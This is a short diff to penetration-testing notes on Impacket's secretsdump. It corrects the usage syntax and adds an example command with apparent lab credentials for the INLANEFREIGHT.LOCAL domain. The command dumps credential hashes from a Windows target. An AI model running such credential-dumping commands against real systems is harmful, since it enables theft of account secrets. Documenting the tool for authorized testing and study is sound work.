@@ -37,8 +37,9 @@ SecretDumps, on the other hand, often works without needing to directly inject i
 
 ## Usage
 
-    impacket-secretdump -sam <target_ip> -user <username> -password <password>
-    impacket-secretdump -ntds <target_ip> -user <username> -password <password>
+    impacket-secretsdump <domain_name>/<username>:<password>@<target_ip>
+    impacket-secretsdump INLANEFREIGHT.LOCAL/svc_sql:lucky7@MS01.INLANEFREIGHT.LOCAL
+
 
 ## Permissions Required
 
